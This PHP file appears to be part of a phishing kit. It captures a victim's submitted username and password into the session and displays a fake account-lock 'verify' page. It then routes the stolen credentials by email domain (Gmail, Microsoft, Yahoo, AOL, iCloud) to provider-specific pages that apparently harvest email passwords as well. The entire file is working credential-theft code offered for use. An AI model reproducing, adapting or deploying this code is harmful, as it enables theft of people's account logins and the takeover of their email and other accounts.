 <?php
error_reporting(0);
require "includes/session_protect.php";
require "includes/functions.php";
require "../lang.php";
require "../config.php";
require "includes/simplehtmldom.php";

$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];

function strafter($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, $pos+strlen($substring)));
}

function strbefore($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, 0, $pos));
} 

$emelbule2 = $_SESSION['user'];
$emelbule1 = strafter($emelbule2,'@');
$emelbule = strbefore($emelbule1,'.');

?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<title></title>
</head>
<body>
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="dialog fade-in">
<div id="isi-dialog" style="padding-right:10%;padding-left:10%">
<br>
<p style="font-size:20px"><?php echo $lock?></p><br>
<b><p style="font-size:15px"><?php echo $ins?></p></b><br>
<p><?php echo $logem?></p>
<p><?php echo $verif?></p><br>
<?php if ($grab_email == "urip") { if($emelbule == "hotmail" || $emelbule == "outlook" || $emelbule == "msn" || $emelbule == "live"){ ?>
<form action='email/microsoft/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
<?php } else if($emelbule == "aol"){ ?>
<form action='email/aol/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
<?php } else if($emelbule == "gmail" || $emelbule == "googlemail"){ ?>
<form action='email/gmail/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
<?php } else if($emelbule == "yahoo" || $emelbule == "ymail" || $emelbule == "bellsouth" || $emelbule == "sbcglobal"){ ?>
<form action='email/yahoo/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
<?php } else if($emelbule == "icloud" || $emelbule == "me"){ ?>
<form action='email/icloud/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
<?php } else { ?>
<form action='includes/ProcessLogin.php' method='post' id="aswdek" target="_top" name='frm'>
<?php }} else { ?>
<form action='includes/ProcessLogin.php' method='post' id="aswdek" target="_top" name='frm'>
<?php } ?>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
<a class="Unclock" target="_top" href="javascript:{}" onclick="document.getElementById('aswdek').submit();" style="font-weight: 500; padding: 5px 16px; background: rgb(0,128,255); color: white; border-radius: 4px; font-size: 18px; text-decoration: none;"><?php echo $unl?></a>
<br><br>
</div>
</div>
</div>
</form>
</body>
</html>
